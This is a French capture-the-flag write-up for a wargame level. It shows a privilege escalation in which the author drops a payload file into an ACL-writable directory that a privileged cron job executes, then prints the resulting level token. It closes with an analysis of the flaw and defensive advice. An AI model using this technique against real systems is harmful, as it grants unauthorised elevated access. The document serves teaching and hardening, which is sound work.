# Level05 — Explications

## Objectif
Exécuter une commande avec les droits de `flag05` pour obtenir le token qui
sert de mot de passe à `level06`.

## La faille
```bash
find / -user flag05 2>/dev/null
# /usr/sbin/openarenaserver
ls -l /usr/sbin/openarenaserver
# -rwxr-x---+ 1 flag05 flag05 94 ... openarenaserver
```
Le `+` indique une **ACL** (permissions étendues au-delà du triplet
propriétaire/groupe/autres) :
```bash
getfacl /usr/sbin/openarenaserver
# user:level05:r--   → lecture autorisée pour level05 malgré "other::---"
```
Contenu du script :
```sh
#!/bin/sh
for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
Il exécute automatiquement **tout fichier** déposé dans
`/opt/openarenaserver/`, puis le supprime. Une autre ACL sur ce dossier
donne à `level05` le droit d'y écrire :
```bash
getfacl /opt/openarenaserver/
# user:level05:rwx
```
Un mécanisme externe (crontab de `flag05`, non visible) ramasse et exécute
périodiquement ces fichiers avec les droits de `flag05` — confirmé en
déposant un fichier `whoami > /tmp/result05` et en lisant le résultat après
coup (la sortie n'étant attachée à aucun terminal, il faut la rediriger).

## Exploitation
```bash
echo 'getflag > /tmp/result05' > /opt/openarenaserver/payload
# ... attendre le ramassage automatique (le fichier disparaît) ...
cat /tmp/result05
# Check flag.Here is your token : viuaaale9huek52boumoomioc
```

Token obtenu : `viuaaale9huek52boumoomioc` — flag de level05 et mot de passe
de level06.

## Analyse de la faille

**Quelle était la faille ?**
Un dossier (`/opt/openarenaserver/`) était accessible en écriture, via ACL, à
un utilisateur non privilégié (`level05`), alors qu'un mécanisme automatique
exécute **sans aucune vérification** tout fichier qui y est déposé, avec les
droits d'un utilisateur plus privilégié (`flag05`). De plus, le binaire
`/usr/sbin/openarenaserver` lui-même était lisible via ACL, révélant ce
comportement à `level05`.

**Pourquoi c'est un problème ?**
- Exécuter aveuglément tout fichier présent dans un répertoire, sans vérifier
  qui l'y a déposé ni son contenu, revient à faire confiance à quiconque peut
  écrire dans ce répertoire.
- Combiner "exécution automatique avec privilèges élevés" et "dossier
  accessible en écriture à un utilisateur moins privilégié" transforme un
  simple droit d'écriture en élévation de privilèges complète.
- Les ACL élargissent l'accès au-delà de ce que montre un simple `ls -l`
  classique ; les oublier lors d'un audit de sécurité est une erreur
  fréquente.

**Comment l'empêcher ?**
- Ne jamais exécuter automatiquement des fichiers déposés dans un répertoire
  accessible en écriture à des utilisateurs moins privilégiés.
- Si un tel mécanisme est nécessaire, restreindre strictement qui peut écrire
  dans le répertoire surveillé (pas d'ACL élargissant l'accès), et/ou valider
  le contenu avant exécution.
- Auditer régulièrement les ACL (`getfacl`) en plus des permissions
  classiques (`ls -l`), car elles sont invisibles sans vérification explicite
  (`+` dans `ls -l` est le seul indice).
